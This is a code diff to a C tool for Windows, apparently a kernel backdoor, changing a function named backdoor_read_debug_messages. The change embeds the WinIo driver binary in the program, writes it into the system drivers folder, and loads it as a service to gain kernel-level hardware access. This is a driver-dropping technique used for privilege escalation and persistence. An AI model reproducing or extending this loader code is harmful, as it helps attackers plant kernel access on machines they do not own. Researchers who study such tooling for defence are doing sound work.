@@ -1,5 +1,8 @@
 #include "stdafx.h"
 
+// winio driver binary
+#include "../winio_sys.h"
+
 // amount of time to collect secure kernel information
 #define SK_INFO_TIMEOUT 5
 
@@ -1643,6 +1646,7 @@ int backdoor_read_debug_messages(void)
         return -1;
     }    
 
+    HANDLE fd = NULL;
     char driver_path[MAX_PATH];
     char *driver_name = WINIO_DRIVER_NAME, *device_path = WINIO_DEVICE_PATH;
 
@@ -1650,11 +1654,18 @@ int backdoor_read_debug_messages(void)
     strcat_s(driver_path, "\\drivers\\");
     strcat_s(driver_path, driver_name);
 
-    // copy driver into the system folder
-    if (!CopyFile(driver_name, driver_path, FALSE))
+    // write driver into the system folder
+    if ((fd = CreateFile(driver_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
     {
-        dbg_printf("CopyFile() ERROR %d\n", GetLastError());
-        dbg_printf("ERROR: Unable to copy \"%s\" into the \"%s\"\n", driver_name, driver_path);
+        DWORD written = 0;
+
+        WriteFile(fd, winio_sys, sizeof(winio_sys), &written, NULL);
+        CloseHandle(fd);
+    }
+    else
+    {
+        dbg_printf("CreateFile() ERROR %d\n", GetLastError());
+        dbg_printf("ERROR: Unable to create driver file \"%s\"\n", driver_path);
         return -1;
     }
 
@@ -1662,8 +1673,7 @@ int backdoor_read_debug_messages(void)
 
     dbg_printf("[+] Loading WinIo driver...\n");
 
-    HANDLE fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-    if (fd == INVALID_HANDLE_VALUE)
+    if ((fd = CreateFile(device_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) == INVALID_HANDLE_VALUE)
     {
         // create and start service
         if (service_start(WINIO_SERVICE_NAME, driver_path, &already_started))
